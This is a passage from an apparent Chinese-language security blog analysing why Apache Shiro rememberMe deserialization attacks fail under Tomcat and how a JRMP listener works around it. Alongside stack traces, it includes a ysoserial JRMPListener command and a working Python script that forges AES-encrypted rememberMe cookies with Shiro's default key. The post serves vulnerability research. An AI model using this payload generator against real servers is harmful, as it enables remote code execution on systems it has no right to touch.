      CLASSPATH=$CLASSPATH:/Users/rai4over/.m2/repository/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar:/Users/rai4over/.m2/repository/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar
Tomcat重新启动后就能成功加载`[Lorg.apache.commons.collections.Transformer;`
  * 在tomcat的上下文环境中调用`Class.forName(name, false, parent)`，使用了`URLClassLoader`作为`ClassLoader`，但在`URLClassLoader`中没有包含`[Lorg.apache.commons.collections.Transformer;`位置，如图所示：
指定`commons-collections-3.2.1.jar`路径即可
    Class.forName("[Lorg.apache.commons.collections.Transformer;", true, new URLClassLoader(new URL[]{new URL("file:///Users/rai4over/.m2/repository/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar")}));
至于能不能直接成功呢，大家可以自己去尝试，hhhhhhh
## 出坑
直接给出答案，可以使用JRMP解决问题。
启动恶意的JRMP服务端
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 '/System/Applications/Calculator.app/Contents/MacOS/Calculator'
生成JRMP客户端payload
    import base64
    import uuid
    import subprocess
    from Crypto.Cipher import AES
    def rememberme(command):
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
        popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections5', command],
                                 stdout=subprocess.PIPE)
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
    if __name__ == '__main__':
        # payload = encode_rememberme('127.0.0.1:12345')
        payload = rememberme('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
        # payload = encode_rememberme('http://shiro.f422cd57.n0p.co')
        with open("./payload.cookie", "w") as fpw:
            print("rememberMe={}".format(payload.decode()))
那为什么`JRMP`能够成功呢？受害服务器成为`JRMP`客户端时，根据`ClassLoader`猜测受害服务器加载过程的不依赖外部库。
ysoserial/src/main/java/ysoserial/payloads/JRMPClient.java
    import java.lang.reflect.Proxy;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.util.Random;
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
翻看`ysoserial`源码payload所需类确实均为`JDK`下。
受害服务器最终肯定是要依靠`Transformer`完成任意代码执行的，那么`[Lorg.apache.commons.collections.Transformer;`究竟如何加载的呢。
受害服务器第一次反序列化成为`JRMP`客户端，并连接恶意的`JRMP`服务端，主要涉及模块`sun.rmi.*`。
sun.rmi.transport.DGCClient#registerRefs
可以看到恶意服务器地址，然后一路跟进
sun.rmi.transport.DGCImpl_Stub#dirty
看起来和`RMI`的过程相似
sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)
sun/rmi/transport/StreamRemoteCall.class:169
连接通信的过程涉及序列化和反序列化，受害服务器接受恶意数据并进行了第二次反序列化，`this.in`类型为`ConnectionInputStream`。
`ConnectionInputStream`通过父类`MarshalInputStream`重写了`resolveClass`
sun.rmi.server.LoaderHandler#loadClass(java.lang.String, java.lang.String,
java.lang.ClassLoader)
sun/rmi/server/LoaderHandler.class:557
这里使用`Class.forName`加载`[Lorg.apache.commons.collections.Transformer;`，并且`Classloader`为`ParallelWebappClassLoader`，此为可并行的`Webapp`加载器，包含整个应用所需的`Class`加载方式。
因此加载`[Lorg.apache.commons.collections.Transformer;`成功，当前的调用栈为：
    forName:348, Class (java.lang)
    loadClassForName:1221, LoaderHandler (sun.rmi.server)
    loadClass:175, LoaderHandler (sun.rmi.server)
    loadClass:637, RMIClassLoader$2 (java.rmi.server)
    loadClass:264, RMIClassLoader (java.rmi.server)
    resolveClass:219, MarshalInputStream (sun.rmi.server)
    readNonProxyDesc:1620, ObjectInputStream (java.io)
    readClassDesc:1521, ObjectInputStream (java.io)
    readArray:1671, ObjectInputStream (java.io)
    readObject0:1347, ObjectInputStream (java.io)
    defaultReadFields:2018, ObjectInputStream (java.io)
    readSerialData:1942, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    defaultReadFields:2018, ObjectInputStream (java.io)
    defaultReadObject:503, ObjectInputStream (java.io)
    readObject:143, LazyMap (org.apache.commons.collections.map)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1909, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    defaultReadFields:2018, ObjectInputStream (java.io)
    readSerialData:1942, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    access$300:208, ObjectInputStream (java.io)
    readFields:2182, ObjectInputStream$GetFieldImpl (java.io)
    readFields:543, ObjectInputStream (java.io)
    readObject:71, BadAttributeValueExpException (javax.management)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1909, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    access$300:208, ObjectInputStream (java.io)
    readFields:2182, ObjectInputStream$GetFieldImpl (java.io)
    readFields:543, ObjectInputStream (java.io)
    readObject:71, BadAttributeValueExpException (javax.management)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1909, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    readObject:373, ObjectInputStream (java.io)
    executeCall:245, StreamRemoteCall (sun.rmi.transport)
    invoke:379, UnicastRef (sun.rmi.server)
    dirty:-1, DGCImpl_Stub (sun.rmi.transport)
    makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)
    registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)
    registerRefs:156, DGCClient (sun.rmi.transport)
    read:312, LiveRef (sun.rmi.transport)
    readExternal:493, UnicastRef (sun.rmi.server)
    readObject:455, RemoteObject (java.rmi.server)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1058, ObjectStreamClass (java.io)
    readSerialData:1909, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    defaultReadFields:2018, ObjectInputStream (java.io)
    readSerialData:1942, ObjectInputStream (java.io)
    readOrdinaryObject:1808, ObjectInputStream (java.io)
    readObject0:1353, ObjectInputStream (java.io)
    readObject:373, ObjectInputStream (java.io)
    deserialize:77, DefaultSerializer (org.apache.shiro.io)
    deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)
    convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)
    getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
    getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)
    resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)
    createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)
    buildSubject:846, Subject$Builder (org.apache.shiro.subject)
    buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)
    createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)
    doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)
    doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)
    internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:199, StandardWrapperValve (org.apache.catalina.core)
    invoke:96, StandardContextValve (org.apache.catalina.core)
    invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:139, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:690, AbstractAccessLogValve (org.apache.catalina.valves)
    invoke:87, StandardEngineValve (org.apache.catalina.core)
    service:343, CoyoteAdapter (org.apache.catalina.connector)
    service:615, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:818, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1627, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:745, Thread (java.lang)
# 总结
两种方式都是使用`Class.forName`进行数组加载，但是`Classloader`大不相同，因此一个能成功一个不行。网上说的都不一定对，人云亦云的比较多，看Java就得像p老板说的敢去翻源码，hhhhhh。
# 参考